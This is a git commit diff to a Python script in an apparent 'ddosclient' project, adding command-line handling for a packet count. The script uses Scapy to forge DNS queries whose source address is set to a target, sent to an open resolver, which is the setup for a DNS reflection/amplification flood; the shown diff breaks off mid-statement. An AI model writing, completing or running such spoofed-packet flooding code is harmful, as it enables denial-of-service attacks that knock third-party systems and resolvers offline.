26344003c9c2ba3cede717e25c9afdc76c135ce1
Javier Nuñez <javi14jul@gmail.com>
2023-11-08 09:13:48 +0100

    add variables

--- mw_ddosclient/app/dns_scapy.py
+++ mw_ddosclient/app/dns_scapy.py
@@ -1,5 +1,6 @@
 from scapy.all import *
 import os
+import sys
 
 # Obtén la dirección IP del servidor desde la variable de entorno
 ddosserver_ip = os.getenv("ddosserver")
@@ -8,9 +9,20 @@ if ddosserver_ip is None:
     print("No se proporcionó una dirección IP para el servidor. Asegúrate de configurar la variable de entorno ddosserver. Ejecuta export ddosserver=¨ip¨")
     exit()
 
+if len(sys.argv) != 2:
+    print("Usage: python3 dns_scapy.py <dns_query_packets>")
+    exit(1)
+
+try:
+    dns_query_packets = int(sys.argv[1])
+except ValueError:
+    print("The argument value must be a valid integer.")
+    exit(1)
+
 target_ip = "example.com" # Replace with the target IP address
 open_dns_resolver = ddosserver_ip # Replace with an open DNS resolver IP
-dns_query_packets = 1000 # Modify as necessary
+
+
 
 # Craft DNS query packet
 dns_query = IP(src=target_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
